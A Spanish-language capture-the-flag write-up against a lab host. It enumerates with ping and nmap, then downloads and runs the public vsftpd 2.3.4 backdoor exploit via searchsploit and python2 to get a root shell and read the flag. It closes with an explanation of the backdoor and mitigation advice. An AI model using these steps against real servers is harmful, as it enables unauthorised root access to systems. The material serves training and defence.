
## Enumeracion

Empiezo haciendo un ping a la maquina para ver el TTL y asi saber que sistema operativo es.
`ping -c 1 172.17.0.2`
```
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=1.41 ms
```

Con esto puedo saber que es un sistema linux.

Prosigo con la enumeracion usando nmap para escanear los puertos para detectar cuales estan abiertos.
`nmap -sVC -p- --min-rate 5000 172.17.0.2 -oG nmap`
```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.3.4
|_ftp-anon: got code 500 "OOPS: cannot change directory:/var/ftp".
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
MAC Address: DE:3F:38:D0:5C:AA (Unknown)
```

Puertos encontrados:

`21/ftp`
`80/Apache`

Aunque nmap diga que es la pagina es la default de apache hago un curl para salir de dudas.

`curl 172.17.0.2`

Una vez confirmado que el apache es el default me centro en investigar el ftp.

## Analisis puerto 21

Al leer la version del ftp veo que es una version bastante vieja asi que la busco en searchsploit en busqueda de algun exploit conocido.

`searchsploit vsftpd 2.3.4`
```

vsftpd 2.3.4 - Backdoor Command Execution                                                                                         | unix/remote/49757.py
vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)                                                                            | unix/remote/17491.rb

```

## Uso del exploit

Veo que hay 2 pero la que me interesa es la de python ya que la otra es de metasploit.

`searchsploit -m unix/remote/49757.py`

Una vez descargado utilizo el exploit con esta syntaxis:
` python2 49757.py 172.17.0.2`

Si una vez ejecutado a salido bien deberia de salir esto

```
Success, shell opened
Send `exit` to quit shell
```

Hago un whoami para asi saber que usuario somos


```
whoami
root
```

Una vez como root llegaremos a la carpeta root asi consiguiendo la flag.
```
cat root.txt
261fd3f32200f950f231816b4e9a0594

```

## Explicacion exploit

Cuando un usuario intenta iniciar sesion y el nombre que pone termina en `:)`

Cuando el ftp recibe ese string ejecuta la funcion
`vsf_sysutil_extra()`

Eso hace que el  servidor abra una shell en el puerto 6200 con privilegios de root.


## Mitigacion

- Actualizar los servicios lo antes posible e instalar los softwares de fuentes oficiales.
- A la hora de actualizar o instalar verificar la integridad con checksums o firmas GPG
- No ejecutar el servicio como root asi en caso de que puedan explotarlo no obtendran root.